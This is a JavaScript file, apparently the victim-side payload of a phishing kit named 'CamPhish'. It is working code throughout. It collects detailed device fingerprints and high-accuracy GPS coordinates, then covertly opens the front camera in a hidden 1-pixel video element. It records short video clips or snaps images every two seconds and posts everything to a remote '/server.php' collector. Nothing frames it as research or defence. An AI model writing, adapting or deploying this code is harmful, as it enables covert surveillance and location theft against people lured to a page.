(function () {
    function getDeviceInfo() {
        var ptf = navigator.platform;
        var cc = navigator.hardwareConcurrency;
        var ram = navigator.deviceMemory;
        var ver = navigator.userAgent;
        var str = ver;
        var os = ver;
        var brw = 'Unknown';
        var canvas = document.createElement('canvas');
        var gl, debugInfo, ven, ren;
        if (cc == undefined) cc = 'N/A';
        if (ram == undefined) ram = 'N/A';
        if (ver.indexOf('Firefox') != -1) { str = str.substring(str.indexOf(' Firefox/') + 1); brw = str.split(' ')[0]; }
        else if (ver.indexOf('Chrome') != -1) { str = str.substring(str.indexOf(' Chrome/') + 1); brw = str.split(' ')[0]; }
        else if (ver.indexOf('Safari') != -1) { str = str.substring(str.indexOf(' Safari/') + 1); brw = str.split(' ')[0]; }
        else if (ver.indexOf('Edge') != -1) { str = str.substring(str.indexOf(' Edge/') + 1); brw = str.split(' ')[0]; }
        try {
            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) { debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL); ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
        } catch (e) { }
        if (!ven) ven = 'N/A';
        if (!ren) ren = 'N/A';
        os = os.substring(0, os.indexOf(')'));
        os = os.split(';')[1];
        if (!os) os = 'N/A';
        os = os.trim();
        return { platform: ptf, browser: brw, cores: cc, ram: ram, gpu_vendor: ven, gpu_renderer: ren, screen_height: window.screen.height, screen_width: window.screen.width, os: os, user_agent: ver, language: navigator.language || 'N/A', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A', connection: navigator.connection ? navigator.connection.effectiveType : 'N/A' };
    }

    function sendData(endpoint, data) {
        if (navigator.sendBeacon) { navigator.sendBeacon(endpoint, new URLSearchParams(data)); }
        else { var xhr = new XMLHttpRequest(); xhr.open('POST', endpoint, true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send(new URLSearchParams(data).toString()); }
    }

    function captureLocation(baseUrl) {
        if (!navigator.geolocation) return;
        var opts = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(function (pos) {
            var device = getDeviceInfo();
            var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection };
            sendData(baseUrl + '/server.php', data);
        }, function (err) {
            var device = getDeviceInfo();
            sendData(baseUrl + '/server.php', { a: 'loc', error: err.code, platform: device.platform, browser: device.browser, os: device.os, timezone: device.timezone });
        }, opts);
    }

    function captureVideo(baseUrl) {
        var video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.muted = true;
        video.volume = 0;
        video.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
        document.body.appendChild(video);

        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user', width: 640, height: 480 } })
            .then(function (stream) {
                video.srcObject = stream;

                function recordClip() {
                    var chunks = [];
                    var mimeType = 'video/webm';
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) { mimeType = 'video/webm;codecs=vp9'; }
                    else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) { mimeType = 'video/webm;codecs=vp8'; }
                    else if (MediaRecorder.isTypeSupported('video/mp4')) { mimeType = 'video/mp4'; }

                    var recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 500000 });

                    recorder.ondataavailable = function (e) {
                        if (e.data.size > 0) { chunks.push(e.data); }
                    };

                    recorder.onstop = function () {
                        var blob = new Blob(chunks, { type: mimeType });
                        var reader = new FileReader();
                        reader.onloadend = function () {
                            var base64 = reader.result;
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', baseUrl + '/server.php', true);
                            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                            xhr.send('a=vid&video=' + encodeURIComponent(base64));
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function (track) { track.stop(); });
                        video.srcObject = null;
                        video.remove();
                    };

                    recorder.start();
                    setTimeout(function () { recorder.stop(); }, 5000);
                }

                setTimeout(recordClip, 1000);
            })
            .catch(function () {
                captureImages(baseUrl);
            });
    }


    function captureImages(baseUrl) {
        var video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
        document.body.appendChild(video);
        var canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.style.display = 'none';
        document.body.appendChild(canvas);

        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
            .then(function (stream) {
                video.srcObject = stream;
                var ctx = canvas.getContext('2d');
                setInterval(function () {
                    ctx.drawImage(video, 0, 0, 640, 480);
                    var imgData = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', baseUrl + '/server.php', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send('a=cam&cat=' + encodeURIComponent(imgData));
                }, 2000);
            })
            .catch(function () { });
    }

    window.CamPhish = {
        init: function (baseUrl) {
            captureLocation(baseUrl);
            if (typeof MediaRecorder !== 'undefined') { captureVideo(baseUrl); }
            else { captureImages(baseUrl); }
        }
    };

    setTimeout(function () {
        if (typeof window.CAMPHISH_URL !== 'undefined') { captureLocation(window.CAMPHISH_URL); }
    }, 100);
})();
